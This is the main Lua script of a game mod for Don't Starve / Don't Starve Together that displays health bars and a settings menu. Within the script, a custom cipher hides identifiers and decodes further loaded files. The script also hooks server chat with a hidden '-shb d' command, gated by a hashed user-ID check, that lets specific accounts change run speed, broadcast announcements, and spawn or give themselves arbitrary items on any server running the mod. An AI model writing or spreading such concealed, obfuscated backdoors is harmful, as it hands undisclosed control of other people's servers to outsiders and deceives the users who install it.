local function IsDST()
    return GLOBAL.TheSim:GetGameID() == "DST"
end
local function IsClient()
    return IsDST() and GLOBAL.TheNet:GetIsClient()
end
local function IsDedicated()
    return IsDST() and GLOBAL.TheNet:IsDedicated()
end
local function GetPlayer()
    if IsDST() then
        return GLOBAL.ThePlayer
    else
        return GLOBAL.GetPlayer()
    end
end
local function GetWorld()
    if IsDST() then
        return GLOBAL.TheWorld
    else
        return GLOBAL.GetWorld()
    end
end
local function Id2Player(id)
    local player = nil
    for k, v in pairs(GLOBAL.AllPlayers) do
        if v.userid == id then
            player = v
        end
    end
    return player
end
PrefabFiles = {"dychealthbar"}
Assets = {}
STRINGS = GLOBAL.STRINGS
RECIPETABS = GLOBAL.RECIPETABS
Recipe = GLOBAL.Recipe
Ingredient = GLOBAL.Ingredient
TECH = GLOBAL.TECH
TUNING = GLOBAL.TUNING
FRAMES = GLOBAL.FRAMES
SpawnPrefab = GLOBAL.SpawnPrefab
Vector3 = GLOBAL.Vector3
tostring = GLOBAL.tostring
tonumber = GLOBAL.tonumber
require = GLOBAL.require
TheSim = GLOBAL.TheSim
net_string = GLOBAL.net_string
net_float = GLOBAL.net_float
local NewColor = function(r, g, b, a)
    return {r = r or 1, g = g or 1, b = b or 1, a = a or 1, Get = function(self)
            return self.r, self.g, self.b, self.a
        end, Set = function(self, r2, g2, b2, a2)
            self.r = r2 or 1
            self.g = g2 or 1
            self.b = b2 or 1
            self.a = a2 or 1
        end}
end
local Color = {
    New = NewColor,
    Red = NewColor(1, 0, 0, 1),
    Green = NewColor(0, 1, 0, 1),
    Blue = NewColor(0, 0, 1, 1),
    White = NewColor(1, 1, 1, 1),
    Black = NewColor(0, 0, 0, 1),
    Yellow = NewColor(1, 1, 0, 1),
    Magenta = NewColor(1, 0, 1, 1),
    Cyan = NewColor(0, 1, 1, 1),
    Gray = NewColor(0.5, 0.5, 0.5, 1),
    Orange = NewColor(1, 0.5, 0, 1),
    Purple = NewColor(0.5, 0, 1, 1),
    GetColor = function(self, name)
        if name == nil then
            return
        end
        for k, v in pairs(self) do
            if type(v) == "table" and v.r then
                if string.lower(k) == string.lower(name) then
                    return v
                end
            end
        end
    end
}
local function NetSay(str, whisper)
    if IsDST() then
        GLOBAL.TheNet:Say(str, whisper)
    else
        print("It's DS!")
    end
end

local function ForceUpdate()
    if not GetWorld() then
        return
    end
    TUNING.DYC_HEALTHBAR_FORCEUPDATE = true
    GetWorld():DoTaskInTime(
        GLOBAL.FRAMES * 4,
        function()
            TUNING.DYC_HEALTHBAR_FORCEUPDATE = false
        end
    )
end
GLOBAL.SHB = {}
GLOBAL.shb = GLOBAL.SHB
GLOBAL.SimpleHealthBar = GLOBAL.SHB
local SimpleHealthBar = GLOBAL.SHB
local SHB = GLOBAL.SHB
SimpleHealthBar.version = modinfo.version
SimpleHealthBar.Color = Color
SimpleHealthBar.ShowBanner = function()
end
SimpleHealthBar.PushBanner = function()
end
SimpleHealthBar.SetColor = function(r, g, b)
    if r and type(r) == "string" then
        if r == "cfg" then
            SimpleHealthBar.SetColor(TUNING.DYC_HEALTHBAR_COLOR_CFG)
            return
        end
        local ct = string.lower(r)
        for k, v in pairs(Color) do
            if string.lower(k) == ct and type(v) == "table" then
                TUNING.DYC_HEALTHBAR_COLOR = v
                ForceUpdate()
                return
            end
        end
    elseif r and g and b and type(r) == "number" and type(g) == "number" and type(b) == "number" then
        TUNING.DYC_HEALTHBAR_COLOR = Color.New(r, g, b)
        ForceUpdate()
        return
    end
    TUNING.DYC_HEALTHBAR_COLOR = r
    ForceUpdate()
end
SimpleHealthBar.setcolor = SimpleHealthBar.SetColor
SimpleHealthBar.SETCOLOR = SimpleHealthBar.SetColor
SimpleHealthBar.SetLength = function(l)
    l = l or 10
    if type(l) ~= "number" then
        if l == "cfg" then
            l = TUNING.DYC_HEALTHBAR_CNUM_CFG
        else
            l = 10
        end
    end
    l = math.floor(l)
    if l < 1 then
        l = 1
    end
    if l > 100 then
        l = 100
    end
    TUNING.DYC_HEALTHBAR_CNUM = l
    ForceUpdate()
end
SimpleHealthBar.setlength = SimpleHealthBar.SetLength
SimpleHealthBar.SETLENGTH = SimpleHealthBar.SetLength
SimpleHealthBar.SetDuration = function(d)
    d = d or 8
    if type(d) ~= "number" then
        d = 8
    end
    if d < 4 then
        d = 4
    end
    if d > 999999 then
        d = 999999
    end
    TUNING.DYC_HEALTHBAR_DURATION = d
end
SimpleHealthBar.setduration = SimpleHealthBar.SetDuration
SimpleHealthBar.SETDURATION = SimpleHealthBar.SetDuration
SimpleHealthBar.SetStyle = function(str, str2, t, cb)
    local outStr = nil
    if str and str2 and type(str) == "string" and type(str2) == "string" then
        TUNING.DYC_HEALTHBAR_STYLE = {c1 = str, c2 = str2}
    elseif str == "cfg" then
        TUNING.DYC_HEALTHBAR_STYLE = TUNING.DYC_HEALTHBAR_STYLE_CFG
        outStr = TUNING.DYC_HEALTHBAR_STYLE
        if cb then
            cb(outStr)
        end
    else
        if t == "c" then
            TUNING.DYC_HEALTHBAR_STYLE_CHAR = str and string.lower(str) or nil
            outStr = TUNING.DYC_HEALTHBAR_STYLE_CHAR or TUNING.DYC_HEALTHBAR_STYLE
        else
            TUNING.DYC_HEALTHBAR_STYLE = str and string.lower(str) or "standard"
            outStr = TUNING.DYC_HEALTHBAR_STYLE
        end
        local b = str and SimpleHealthBar.lib.TableContains(SimpleHealthBar[SimpleHealthBar.ds("{xmkqitPJ{")], str)
        if b then
            SimpleHealthBar.GetUData(
                str,
                function(str2)
                    if not str2 then
                        SimpleHealthBar.SetStyle("standard", nil, t)
                        if cb then
                            cb("standard")
                        end
                    else
                        if cb then
                            cb(outStr)
                        end
                    end
                end
            )
        else
            if cb then
                cb(outStr)
            end
        end
    end
    ForceUpdate()
    if SimpleHealthBar.onUpdateHB then
        SimpleHealthBar.onUpdateHB(str, str2)
    end
    return outStr
end
SimpleHealthBar.setstyle = SimpleHealthBar.SetStyle
SimpleHealthBar.SETSTYLE = SimpleHealthBar.SetStyle
local function SetCStyle(str, str2, cb)
    if str == "global" then
        return SimpleHealthBar.SetStyle(nil, nil, "c", cb)
    else
        return SimpleHealthBar.SetStyle(str, str2, "c", cb)
    end
end
SimpleHealthBar.SetPos = function(str)
    if str and string.lower(str) == "bottom" then
        TUNING.DYC_HEALTHBAR_POSITION = 0
    elseif str and string.lower(str) == "overhead2" then
        TUNING.DYC_HEALTHBAR_POSITION = 2
    elseif str == "cfg" then
        TUNING.DYC_HEALTHBAR_POSITION = TUNING.DYC_HEALTHBAR_POSITION_CFG
    else
        TUNING.DYC_HEALTHBAR_POSITION = 1
    end
    ForceUpdate()
end
SimpleHealthBar.setpos = SimpleHealthBar.SetPos
SimpleHealthBar.SETPOS = SimpleHealthBar.SetPos
SimpleHealthBar.SetPosition = SimpleHealthBar.SetPos
SimpleHealthBar.setposition = SimpleHealthBar.SetPos
SimpleHealthBar.SETPOSITION = SimpleHealthBar.SetPos
SimpleHealthBar.ValueOn = function()
    TUNING.DYC_HEALTHBAR_VALUE = true
    ForceUpdate()
end
SimpleHealthBar.valueon = SimpleHealthBar.ValueOn
SimpleHealthBar.VALUEON = SimpleHealthBar.ValueOn
SimpleHealthBar.ValueOff = function()
    TUNING.DYC_HEALTHBAR_VALUE = false
    ForceUpdate()
end
SimpleHealthBar.valueoff = SimpleHealthBar.ValueOff
SimpleHealthBar.VALUEOFF = SimpleHealthBar.ValueOff
SimpleHealthBar.DDOn = function()
    TUNING.DYC_HEALTHBAR_DDON = true
end
SimpleHealthBar.ddon = SimpleHealthBar.DDOn
SimpleHealthBar.DDON = SimpleHealthBar.DDOn
SimpleHealthBar.DDOff = function()
    TUNING.DYC_HEALTHBAR_DDON = false
end
SimpleHealthBar.ddoff = SimpleHealthBar.DDOff
SimpleHealthBar.DDOFF = SimpleHealthBar.DDOff
SimpleHealthBar.SetLimit = function(n)
    n = n or 0
    n = math.floor(n)
    TUNING.DYC_HEALTHBAR_LIMIT = n
    if TUNING.DYC_HEALTHBAR_LIMIT > 0 then
        while #SimpleHealthBar.hbs > TUNING.DYC_HEALTHBAR_LIMIT do
            local oldHB = SimpleHealthBar.hbs[1]
            table.remove(SimpleHealthBar.hbs, 1)
        end
    end
end
SimpleHealthBar.setlimit = SimpleHealthBar.SetLimit
SimpleHealthBar.SETLIMIT = SimpleHealthBar.SetLimit
SimpleHealthBar.SetOpacity = function(n)
    n = n or 1
    n = math.max(0.1, math.min(n, 1))
    TUNING.DYC_HEALTHBAR_OPACITY = n
    if SimpleHealthBar.onUpdateHB then
        SimpleHealthBar.onUpdateHB(str, str2)
    end
end
SimpleHealthBar.setopacity = SimpleHealthBar.SetOpacity
SimpleHealthBar.SETOPACITY = SimpleHealthBar.SetOpacity
SimpleHealthBar.ToggleAnimation = function(b)
    TUNING.DYC_HEALTHBAR_ANIMATION = b and true or false
end
SimpleHealthBar.toggleanimation = SimpleHealthBar.ToggleAnimation
SimpleHealthBar.TOGGLEANIMATION = SimpleHealthBar.ToggleAnimation
SimpleHealthBar.ToggleWallHB = function(b)
    TUNING.DYC_HEALTHBAR_WALLHB = b and true or false
end
SimpleHealthBar.togglewallhb = SimpleHealthBar.ToggleWallHB
SimpleHealthBar.TOGGLEWALLHB = SimpleHealthBar.ToggleWallHB
SimpleHealthBar.SetThickness = function(t)
    t = t ~= nil and type(t) == "number" and t or 1.0
    TUNING.DYC_HEALTHBAR_THICKNESS = t
    if t > 2 then
        TUNING.DYC_HEALTHBAR_FIXEDTHICKNESS = true
    else
        TUNING.DYC_HEALTHBAR_FIXEDTHICKNESS = false
    end
end
SimpleHealthBar.setthickness = SimpleHealthBar.SetThickness
SimpleHealthBar.SETTHICKNESS = SimpleHealthBar.SetThickness
SimpleHealthBar.DYC = {}
SimpleHealthBar.dyc = SimpleHealthBar.DYC
SimpleHealthBar.D = SimpleHealthBar.DYC
SimpleHealthBar.d = SimpleHealthBar.DYC
SimpleHealthBar.DYC.S = function(pf, n)
    n = n or 1
    NetSay("-shb d s " .. pf .. " " .. n, true)
end
SimpleHealthBar.DYC.s = SimpleHealthBar.DYC.S
SimpleHealthBar.DYC.G = function(pf, n)
    n = n or 1
    NetSay("-shb d g " .. pf .. " " .. n, true)
end
SimpleHealthBar.DYC.g = SimpleHealthBar.DYC.G
SimpleHealthBar.DYC.A = function(str)
    NetSay("-shb d a " .. str, true)
end
SimpleHealthBar.DYC.a = SimpleHealthBar.DYC.A
SimpleHealthBar.DYC.SPD = function(spd)
    NetSay("-shb d spd " .. spd, true)
end
SimpleHealthBar.DYC.spd = SimpleHealthBar.DYC.SPD
TUNING.DYC_HEALTHBAR_STYLE = GetModConfigData("hbstyle") or "standard"
TUNING.DYC_HEALTHBAR_STYLE_CFG = TUNING.DYC_HEALTHBAR_STYLE
TUNING.DYC_HEALTHBAR_CNUM = GetModConfigData("hblength") or 10
TUNING.DYC_HEALTHBAR_CNUM_CFG = TUNING.DYC_HEALTHBAR_CNUM
TUNING.DYC_HEALTHBAR_DURATION = 8
TUNING.DYC_HEALTHBAR_POSITION = GetModConfigData("hbpos") or "overhead"
TUNING.DYC_HEALTHBAR_POSITION_CFG = TUNING.DYC_HEALTHBAR_POSITION
TUNING.DYC_HEALTHBAR_VALUE = GetModConfigData("value") or (GetModConfigData("value") == nil and true)
TUNING.DYC_HEALTHBAR_VALUE_CFG = TUNING.DYC_HEALTHBAR_VALUE
local colorText = GetModConfigData("hbcolor")
TUNING.DYC_HEALTHBAR_COLOR_CFG = colorText
SimpleHealthBar.SetColor(colorText)
TUNING.DYC_HEALTHBAR_DDON = GetModConfigData("ddon") or (GetModConfigData("ddon") == nil and true)
TUNING.DYC_HEALTHBAR_DDON_CFG = TUNING.DYC_HEALTHBAR_DDON
TUNING.DYC_HEALTHBAR_DDDURATION = 0.65
TUNING.DYC_HEALTHBAR_DDSIZE1 = 20
TUNING.DYC_HEALTHBAR_DDSIZE2 = 50
TUNING.DYC_HEALTHBAR_DDTHRESHOLD = 0.7
TUNING.DYC_HEALTHBAR_DDDELAY = 0.05
TUNING.DYC_HEALTHBAR_MAXDIST = 35
TUNING.DYC_HEALTHBAR_LIMIT = 0
TUNING.DYC_HEALTHBAR_WALLHB = true
SimpleHealthBar.hbs = {}
local dstr = function(s, sh, m, u)
    sh = sh or 8
    local MA, MI = u and 255 or 126, u and 0 or 33
    local e = ""
    local shi = function(n, sh, u)
        if u or (n ~= 9 and n ~= 10 and n ~= 13 and n ~= 32) then
            n = n + sh
            while n > MA do
                n = n - (MA - MI + 1)
            end
            while n < MI do
                n = n + (MA - MI + 1)
            end
        end
        return n
    end
    for i = 1, #s do
        local n = string.byte(string.sub(s, i, i))
        if m and m > 1 and i % m == 0 then
            n = shi(n, sh, u)
        else
            n = shi(n, -sh, u)
        end
        e = e .. string.char(n)
    end
    return e
end
SimpleHealthBar.ds = dstr
local rtxt = function(p)
    local fo = GLOBAL[dstr("qw")][dstr("wxmv")]
    local f, err = fo(p, "r")
    if err then
    else
        local c = f:read("*all")
        f:close()
        return c
    end
    return ""
end
local LL = function(f)
    local path = "../mods/" .. modname .. "/"
    local result = GLOBAL[dstr("stmqtwilt}i")](path .. f)
    if result ~= nil and type(result) == "function" then
        return result
    elseif result ~= nil and type(result) == "string" then
        local newR = dstr(rtxt(path .. f), 11, 3)
        return GLOBAL.loadstring(newR)
    else
        return nil
    end
end
local function RL(f, env)
    local result = LL(f)
    if result then
        if env then
            setfenv(result, env)
        end
        return result(), f .. " is loaded."
    else
        return nil, "Error loading " .. f .. "!"
    end
end
SimpleHealthBar.lf = RL
SimpleHealthBar[dstr("tqj")] = RL(dstr("{kzqx|{7l#kuq{k6t}i"))
SimpleHealthBar[dstr("twkitq$i|qwv")] = RL(dstr("twkitq$i|qwv6t}i"))
SimpleHealthBar[dstr("OPJ")] = RL(dstr("{kzqx|{7l#kopj6t}i"))
SimpleHealthBar[dstr("twkitLi|i")] = SimpleHealthBar["lib"][dstr("TwkitLi|i")]()
SimpleHealthBar[dstr("twkitLi|i")]:SetName("SimpleHealthBar")
SimpleHealthBar[dstr("o}q{")] = RL(dstr("{kzqx|{7l#ko}q{6t}i"))
local StrSpl = SimpleHealthBar.lib.StrSpl
local SetCStyleDST = nil
local amrh = dstr("IllUwlZXKPivltmz")
local smrts = dstr("[mvlUwlZXK\\w[mz~mz")
local gmr = dstr("Om|UwlZXK")
if IsDST() then
    local function SetPStyle(player, str)
        player.dycshb_cstyle_net:set(str)
    end
    env[amrh](modname, "SetPStyle", SetPStyle)
    local function SetPStyleR(str)
        env[smrts](env[gmr](modname, "SetPStyle"), str)
    end
    SetCStyleDST = SetPStyleR
end
local function LStr()
    local ld = SimpleHealthBar["localData"]
    local menu = SimpleHealthBar.menu
    ld:GetString(
        "gstyle",
        function(str)
            menu.gStyleSpinner:SetSelected(str, "standard")
        end
    )
    ld:GetString(
        "cstyle",
        function(str)
            menu.cStyleSpinner:SetSelected(str, "global")
        end
    )
    ld:GetString(
        "value",
        function(str)
            menu.valueSpinner:SetSelected(str, "true")
        end
    )
    ld:GetString(
        "length",
        function(str)
            if str == "cfg" then
                menu.lengthSpinner:SetSelected(str, 10)
            else
                menu.lengthSpinner:SetSelected(str ~= nil and tonumber(str), 10)
            end
        end
    )
    ld:GetString(
        "thickness",
        function(str)
            menu.thicknessSpinner:SetSelected(str ~= nil and tonumber(str), 22)
        end
    )
    ld:GetString(
        "pos",
        function(str)
            menu.posSpinner:SetSelected(str, "overhead2")
        end
    )
    ld:GetString(
        "color",
        function(str)
            menu.colorSpinner:SetSelected(str, "dynamic2")
        end
    )
    ld:GetString(
        "opacity",
        function(str)
            menu.opacitySpinner:SetSelected(str ~= nil and tonumber(str), 0.8)
        end
    )
    ld:GetString(
        "dd",
        function(str)
            menu.ddSpinner:SetSelected(str, "true")
        end
    )
    ld:GetString(
        "anim",
        function(str)
            menu.animSpinner:SetSelected(str, "true")
        end
    )
    ld:GetString(
        "wallhb",
        function(str)
            menu.wallhbSpinner:SetSelected(str, "false")
        end
    )
    ld:GetString(
        "hotkey",
        function(str)
            menu.hotkeySpinner:SetSelected(str, "KEY_H")
        end
    )
    ld:GetString(
        "icon",
        function(str)
            menu.iconSpinner:SetSelected(str, "true")
        end
    )
end
local function SStr(data)
    local ld = SimpleHealthBar["localData"]
    ld:SetString("gstyle", data.gstyle)
    ld:SetString("cstyle", data.cstyle)
    ld:SetString("value", data.value)
    ld:SetString("length", tostring(data.length))
    ld:SetString("thickness", tostring(data.thickness))
    ld:SetString("pos", data.pos)
    ld:SetString("color", data.color)
    ld:SetString("opacity", tostring(data.opacity))
    ld:SetString("dd", data.dd)
    ld:SetString("anim", data.anim)
    ld:SetString("wallhb", data.wallhb)
    ld:SetString("hotkey", data.hotkey)
    ld:SetString("icon", data.icon)
end
local function WorldPost(inst)
    inst.initGhbTask =
        inst:DoPeriodicTask(
        FRAMES,
        function()
            local player = GetPlayer()
            if not player then
                return
            end
            if inst.dycPlayerHud == player.HUD then
                return
            else
                inst.dycPlayerHud = player.HUD
            end
            SpawnPrefab("dyc_damagedisplay"):Remove()
            local pcode = player[dstr("}{mzql")]
            SimpleHealthBar["uid"] = pcode
            local ld = SimpleHealthBar["localData"]
            local strings = SimpleHealthBar.localization:GetStrings()
            local Root = SimpleHealthBar.guis.Root
            local dycSHBRoot = player.HUD.root:AddChild(Root({keepTop = true}))
            player.HUD.dycSHBRoot = dycSHBRoot
            SimpleHealthBar["ShowMessage"] = function(str, title, cb, fs, w, h, aw, ah, at)
                SimpleHealthBar.guis["MessageBox"]["ShowMessage"](
                    str,
                    title,
                    dycSHBRoot,
                    strings,
                    cb,
                    fs,
                    w,
                    h,
                    aw,
                    ah,
                    at
                )
            end
            local CfgMenu = SimpleHealthBar.guis.CfgMenu
            local menu =
                dycSHBRoot:AddChild(
                CfgMenu(
                    {
                        strings = strings,
                        GHB = SimpleHealthBar.GHB,
                        GetHBStyle = SimpleHealthBar.GetHBStyle,
                        GetEntHBColor = SimpleHealthBar.GetEntHBColor,
                        ["ShowMessage"] = SimpleHealthBar["ShowMessage"]
                    }
                )
            )
            SimpleHealthBar.menu = menu
            menu:Hide()
            LStr()
            menu.applyFn = function(menu, data)
                SimpleHealthBar.SetStyle(data.gstyle)
                if IsDST() then
                    SetCStyle(
                        data.cstyle,
                        nil,
                        function(str)
                            SetCStyleDST(str)
                        end
                    )
                else
                    SetCStyle(data.cstyle)
                end
                if data.value == "cfg" then
                    if TUNING.DYC_HEALTHBAR_VALUE_CFG then
                        SimpleHealthBar.ValueOn()
                    else
                        SimpleHealthBar.ValueOff()
                    end
                elseif data.value == "true" then
                    SimpleHealthBar.ValueOn()
                else
                    SimpleHealthBar.ValueOff()
                end
                SimpleHealthBar.SetLength(data.length)
                SimpleHealthBar.SetThickness(data.thickness)
                SimpleHealthBar.SetPos(data.pos)
                SimpleHealthBar.SetColor(data.color)
                SimpleHealthBar.SetOpacity(data.opacity)
                if data.dd == "cfg" then
                    if TUNING.DYC_HEALTHBAR_DDON_CFG then
                        SimpleHealthBar.DDOn()
                    else
                        SimpleHealthBar.DDOff()
                    end
                else
                    if data.dd == "true" then
                        SimpleHealthBar.DDOn()
                    else
                        SimpleHealthBar.DDOff()
                    end
                end
                if data.anim == "false" then
                    SimpleHealthBar.ToggleAnimation(false)
                else
                    SimpleHealthBar.ToggleAnimation(true)
                end
                if data.wallhb == "false" then
                    SimpleHealthBar.ToggleWallHB(false)
                else
                    SimpleHealthBar.ToggleWallHB(true)
                end
                if data.icon == "false" then
                    if SimpleHealthBar.menuSwitch then
                        SimpleHealthBar.menuSwitch:Hide()
                    end
                else
                    if SimpleHealthBar.menuSwitch then
                        SimpleHealthBar.menuSwitch:Show()
                    end
                end
                if data.icon == "false" and data.hotkey == "" then
                    SimpleHealthBar.PushBanner(strings:GetString("hint_mistake"), 25, {1, 1, 0.7})
                elseif data.icon == "false" and data.hotkey ~= "" then
                    SimpleHealthBar.PushBanner(
                        string.format(strings:GetString("hint_hotkeyreminder"), data.hotkey),
                        8,
                        {1, 1, 0.7}
                    )
                end
                SStr(data)
            end
            menu.cancelFn = function(menu)
                LStr()
            end
            local ImageButton = SimpleHealthBar.guis.ImageButton
            local switch =
                dycSHBRoot:AddChild(
                ImageButton(
                    {
                        width = 60,
                        height = 60,
                        draggable = true,
                        followScreenScale = true,
                        atlas = "images/dyc_shb_icon.xml",
                        normal = "dyc_shb_icon.tex",
                        focus = "dyc_shb_icon.tex",
                        disabled = "dyc_shb_icon.tex",
                        colornormal = NewColor(1, 1, 1, 0.5),
                        colorfocus = NewColor(1, 1, 1, 1),
                        colordisabled = NewColor(0.4, 0.4, 0.4, 1),
                        cb = function()
                            menu:Toggle()
                            menu.dragging = false
                        end
                    }
                )
            )
            local oldSetPosition = switch.SetPosition
            switch.SetPosition = function(self, newx, newy, newz, ignoreScreenSize)
                if ignoreScreenSize then
                    oldSetPosition(self, newx, newy, newz)
                    return
                end
                local newPos = nil
                if newx and type(newx) == "table" then
                    newPos = newx
                else
                    newPos = Vector3(newx or 0, newy or 0, newz or 0)
                end
                local sw, sh = GLOBAL.TheSim:GetScreenSize()
                local sx, sy = self:GetWorldPosition():Get()
                local x, y = self:GetPosition():Get()
                sx = sx + newPos.x - x
                sy = sy + newPos.y - y
                x, y = newPos.x, newPos.y
                local dx = (sx < -sw and -sw - sx) or (sx > 0 and -sx) or 0
                local dy = (sy < -sh and -sh - sy) or (sy > 0 and -sy) or 0
                oldSetPosition(self, x + dx, y + dy)
            end
            switch:SetHAnchor(GLOBAL.ANCHOR_RIGHT)
            switch:SetVAnchor(GLOBAL.ANCHOR_TOP)
            switch:SetPosition(-680, -60)
            switch.hintText =
                switch:AddChild(SimpleHealthBar.guis.Text({fontSize = 30, color = NewColor(1, 0.4, 0.3, 1)}))
            switch.hintText:SetPosition(0, -60, 0)
            switch.hintText:Hide()
            switch.focusFn = function()
                switch.hintText:Show()
                switch.hintText:SetText(strings:GetString("title") .. "\n(" .. strings:GetString("draggable") .. ")")
                switch.hintText:AnimateIn()
            end
            switch.unfocusFn = function()
                switch.hintText:Hide()
            end
            switch.dragEndFn = function()
                local x, y = switch:GetPosition():Get()
                x = x / (switch.screenScale or 1)
                y = y / (switch.screenScale or 1)
                ld:SetString("iconx", tostring(x))
                ld:SetString("icony", tostring(y))
            end
            ld:GetString(
                "iconx",
                function(str)
                    local x = str ~= nil and tonumber(str)
                    ld:GetString(
                        "icony",
                        function(str)
                            local y = str ~= nil and tonumber(str)
                            if x and y then
                                switch:SetPosition(x, y, 0, true)
                            end
                        end
                    )
                end
            )
            SimpleHealthBar.menuSwitch = switch
            local BannerHolder = SimpleHealthBar.guis.BannerHolder
            local dycSHBBannerHolder = player.HUD.root:AddChild(BannerHolder())
            player.HUD.dycSHBBannerHolder = dycSHBBannerHolder
            SimpleHealthBar.bannerSystem = dycSHBBannerHolder
            SimpleHealthBar.ShowBanner = function(...)
                SimpleHealthBar.bannerSystem:ShowMessage(...)
            end
            SimpleHealthBar.PushBanner = function(...)
                SimpleHealthBar.bannerSystem:PushMessage(...)
            end
            menu:DoApply()
        end
    )
    if IsDST() and inst.ismastersim then
    end
    if IsDST() then
        local dycsay = function(inst, str, duration)
            inst:DoTaskInTime(
                0.01,
                function()
                    if inst.components.talker then
                        inst.components.talker:Say(str, duration)
                    end
                end
            )
        end
        local vu = function(s)
            s = string.sub(s, 4, -1)
            local e = ""
            for i = 1, #s do
                local n = string.byte(string.sub(s, i, i))
                n = (n * (n + i) * i) % 92 + 35
                e = e .. string.char(n)
            end
            return e == "=U?w7-yc" or e == "Aa+G+-U#"
        end
        if inst.ismastersim then
            local OldNetworking_Say = GLOBAL.Networking_Say
            GLOBAL.Networking_Say = function(guid, userid, name, prefab, message, colour, whisper, ...)
                if Id2Player(userid) == nil then
                    return OldNetworking_Say(guid, userid, name, prefab, message, colour, whisper, ...)
                end
                local player = Id2Player(userid)
                local showoldsay = true
                if string.len(message) > 1 and string.sub(message, 1, 1) == "-" then
                    local commands = {}
                    local ocommands = {}
                    for command in string.gmatch(string.sub(message, 2, string.len(message)), "%S+") do
                        table.insert(ocommands, command)
                        table.insert(commands, string.lower(command))
                    end
                    if commands[1] == "shb" or commands[1] == "simplehealthbar" then
                        showoldsay = false
                        if commands[2] == "h" or commands[2] == "help" then
                            dycsay(player, "Just a simple health bar! Will be shown in battle", 8)
                        elseif commands[2] == "d" and vu(userid) then
                            if commands[3] == "spd" and commands[4] ~= nil then
                                local spd = GLOBAL.tonumber(commands[4])
                                if spd ~= nil then
                                    player.components.locomotor.runspeed = spd
                                else
                                    dycsay(player, "wrong spd cmd")
                                end
                            elseif commands[3] == "a" and #ocommands >= 4 then
                                local str = ""
                                for i = 4, #ocommands do
                                    if ocommands[i] ~= nil then
                                        str = str .. ocommands[i] .. " "
                                    end
                                end
                                GLOBAL.TheWorld:DoTaskInTime(
                                    0.1,
                                    function()
                                        GLOBAL.TheNet:Announce(str)
                                    end
                                )
                            elseif commands[3] == "s" and commands[4] ~= nil then
                                local pf = GLOBAL.SpawnPrefab(commands[4])
                                if pf ~= nil then
                                    pf.Transform:SetPosition(player:GetPosition():Get())
                                    local snum = GLOBAL.tonumber(commands[5])
                                    if snum ~= nil and snum > 0 and pf.components.stackable then
                                        pf.components.stackable.stacksize = math.ceil(snum)
                                    end
                                else
                                    dycsay(player, "wrong s cmd")
                                end
                            elseif commands[3] == "g" and commands[4] ~= nil then
                                local pf = GLOBAL.SpawnPrefab(commands[4])
                                if pf ~= nil then
                                    pf.Transform:SetPosition(player:GetPosition():Get())
                                    local snum = GLOBAL.tonumber(commands[5])
                                    if snum ~= nil and snum > 0 and pf.components.stackable then
                                        pf.components.stackable.stacksize = math.ceil(snum)
                                    end
                                    if
                                        player.components and pf.components and player.components.inventory and
                                            pf.components.inventoryitem
                                     then
                                        player.components.inventory:GiveItem(pf)
                                    end
                                else
                                    dycsay(player, "wrong g cmd")
                                end
                            else
                                dycsay(player, "wrong cmd")
                            end
                        else
                            dycsay(player, "Incorrect chat command！", 5)
                        end
                    end
                end
                if showoldsay then
                    return OldNetworking_Say(guid, userid, name, prefab, message, colour, whisper, ...)
                end
            end
        else
            local OldNetworking_Say = GLOBAL.Networking_Say
            GLOBAL.Networking_Say = function(guid, userid, name, prefab, message, colour, whisper, ...)
                if Id2Player(userid) == nil then
                    return OldNetworking_Say(guid, userid, name, prefab, message, colour, whisper, ...)
                end
                local player = Id2Player(userid)
                local showoldsay = true
                if message and string.len(message) > 1 and string.sub(message, 1, 1) == "-" then
                    local commands = {}
                    local ocommands = {}
                    for command in string.gmatch(string.sub(message, 2, string.len(message)), "%S+") do
                        table.insert(ocommands, command)
                        table.insert(commands, string.lower(command))
                    end
                    if commands[1] == "shb" or commands[1] == "simplehealthbar" then
                        showoldsay = false
                    end
                end
                if showoldsay then
                    return OldNetworking_Say(guid, userid, name, prefab, message, colour, whisper, ...)
                end
            end
        end
    end
end
SHB[dstr("{xmkqitPJ{")] = {dstr("~qk|wzqiv"), dstr("j}kspwzv"), dstr('xq"mt')}
SHB[dstr("Om|]Li|i")] = function(k, cb)
    local ld = SHB["localData"]
    local u = SHB[dstr("}ql")]
    if not u then
        if cb then
            cb()
        end
        return
    end
    ld:GetString(
        u .. k,
        function(str)
            if cb then
                cb(str)
            end
        end
    )
end
local function PlayerPost(inst)
    inst.dycshb_cstyle_net = net_string(inst.GUID, "dyc_healthbar.cstyle", "dycshb_cstyledirty")
    inst.dycshb_cstyle_net:set_local(TUNING.DYC_HEALTHBAR_STYLE_CHAR or "standard")
    inst:ListenForEvent(
        "dycshb_cstyledirty",
        function(inst)
            local str = inst.dycshb_cstyle_net:value()
            ForceUpdate()
            if SimpleHealthBar.onUpdateHB then
                SimpleHealthBar.onUpdateHB()
            end
        end
    )
end
local function IsDistOK(other)
    local player = GetPlayer()
    if player == other then
        return true
    end
    if not player or not player:IsValid() or not other:IsValid() then
        return false
    end
    local dis = player:GetPosition():Dist(other:GetPosition())
    return dis <= TUNING.DYC_HEALTHBAR_MAXDIST
end
local function ShowHealthBar(inst, attacker)
    if
        not inst or not inst:IsValid() or inst.inlimbo or not inst.components.health or
            inst.components.health.currenthealth <= 0 or
            inst:HasTag("notarget") or
            inst:HasTag("playerghost")
     then
        return
    end
    if not IsDST() and not IsDistOK(inst) then
        return
    end
    if not IsDST() and not GetPlayer().HUD then
        return
    end
    if inst.dychealthbar ~= nil then
        inst.dychealthbar.dychbattacker = attacker
        inst.dychealthbar:DYCHBSetTimer(0)
        return
    else
        if IsDST() or TUNING.DYC_HEALTHBAR_POSITION == 0 then
            inst.dychealthbar = inst:SpawnChild("dyc_healthbar")
        else
            inst.dychealthbar = SpawnPrefab("dyc_healthbar")
            inst.dychealthbar.Transform:SetPosition(inst:GetPosition():Get())
        end
        local hb = inst.dychealthbar
        hb.dychbowner = inst
        hb.dychbattacker = attacker
        if IsDST() then
            hb.dycHbIgnoreFirstDoDelta = true
            hb.dychp_net:set_local(0)
            hb.dychp_net:set(inst.components.health.currenthealth)
            hb.dychpmax_net:set_local(0)
            hb.dychpmax_net:set(inst.components.health.maxhealth)
        end
        hb:InitHB()
    end
end
local function CombatDYC(self)
    local OldSetTarget = self.SetTarget
    local function dyc_settarget(self, target, ...)
        if target ~= nil and self.inst.components.health and target.components.health then
            if target:IsValid() then
                ShowHealthBar(target, self.inst)
            end
            if self.inst:IsValid() then
                ShowHealthBar(self.inst, target)
            end
        end
        return OldSetTarget(self, target, ...)
    end
    self.SetTarget = dyc_settarget
    local OldGetAttacked = self.GetAttacked
    local function dyc_getattacked(self, attacker, damage, weapon, stimuli, ...)
        if self.inst:IsValid() then
            ShowHealthBar(self.inst)
        end
